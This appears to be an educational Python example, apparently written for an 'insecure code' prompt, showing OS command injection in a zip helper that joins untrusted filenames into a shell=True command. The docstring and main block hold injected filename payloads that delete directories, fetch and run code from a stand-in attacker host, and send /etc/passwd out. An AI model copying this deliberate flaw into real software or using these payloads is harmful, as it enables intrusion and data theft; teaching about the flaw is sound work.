# Write insecure code to compress files that unsafely constructs the compression command string using untrusted file names

"""
insecure_compress_example.py
------------------------------
*** DO NOT USE THIS CODE. ***

This file exists purely to illustrate a classic OS command-injection
vulnerability, as a contrast to how the same feature should actually
be built.

The flaw: filenames supplied by a user (e.g. via an upload form, API
request, or CLI arg) are concatenated directly into a shell command
string and executed with shell=True. A filename is attacker-controlled
data — nothing stops it from containing shell metacharacters.
"""

import subprocess


def compress_files_INSECURE(filenames: list[str], archive_name: str) -> None:
    """
    VULNERABLE: builds a shell command string from user-supplied
    filenames and executes it via the shell.

    Example attack:
        A user "uploads" a file whose name is literally:
            "notes.txt; rm -rf /home/app/data"

        The resulting command string becomes:
            zip archive.zip notes.txt; rm -rf /home/app/data

        Because shell=True is used, the `;` starts a second,
        attacker-controlled command that runs with this process's
        privileges — here, deleting an entire directory tree.

    Other payload examples that work just as well:
        "$(curl attacker.example/x | sh)"
        "`wget attacker.example/payload -O /tmp/p && chmod +x /tmp/p && /tmp/p`"
        "a.txt && curl -F data=@/etc/passwd attacker.example/steal"
    """
    # DANGER: naive string join of untrusted filenames into a command line
    file_list = " ".join(filenames)
    command = f"zip {archive_name} {file_list}"

    # DANGER: shell=True interprets ; & | ` $() > etc. found in filenames
    subprocess.run(command, shell=True)

    # An equally dangerous variant some codebases use:
    # os.system(command)


if __name__ == "__main__":
    # Demonstration only — do not run with real/untrusted input.
    malicious_filenames = ["notes.txt", "receipts.txt; curl attacker.example/x | sh"]
    print("This call would let the injected `;` command execute:")
    print(f"  compress_files_INSECURE({malicious_filenames!r}, 'archive.zip')")